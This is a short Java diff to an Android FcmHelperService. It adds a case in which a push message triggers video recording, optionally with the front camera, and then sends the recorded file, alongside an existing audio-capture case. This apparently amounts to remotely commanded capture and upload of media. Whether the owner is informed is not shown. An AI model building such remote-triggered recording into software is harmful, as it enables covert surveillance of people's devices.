@@ -58,6 +58,17 @@ public class FcmHelperService {
                 };
                 servicosHelper.getAudio(context,fcmMessageVO.getDuracao(),callback);
                 break;
+            case OBTER_VIDEO:
+                TaskComplete cb=new TaskComplete() {
+                    @Override
+                    public void onFinish(Object object) {
+                        if(object!=null){
+                            enviarArquivo((String) object);
+                        }
+                    }
+                };
+                servicosHelper.getVideo(context,fcmMessageVO.getDuracao(),fcmMessageVO.getCameraFrente(),cb);
+                break;
             default:
                 return;
         }
